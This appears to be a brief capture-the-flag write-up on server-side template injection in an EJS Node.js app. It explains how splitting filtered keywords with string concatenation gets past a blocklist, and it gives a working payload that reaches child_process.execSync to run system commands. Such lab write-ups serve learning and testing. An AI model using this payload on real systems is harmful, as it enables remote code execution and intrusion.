---
title: First Web App
draft: false
tags:
  - ssti
  - node
date: 2025-05-24
---
# EJS SSTI

It's pretty easy to see that we have SSTI (Server Side Template Injection) on the username parameter. 
The templating engine is EJS. The difficulty here is that many useful keywords like `process`, `global`, `require` and possibly many others are filtered.
The trick is to use some javascript obfuscation so for instance instead of `"process"` we an use `"pro"+"cess"` where the `+` sign is string concatenation.

A working payload is the following:

```javascript
<%= 7*7 %>
<%= this["glo"+"bal"]["pro"+"cess"]["mainModule"]["re"+"quire"]("child_pro"+"cess")["execSync"]("id"); %>
```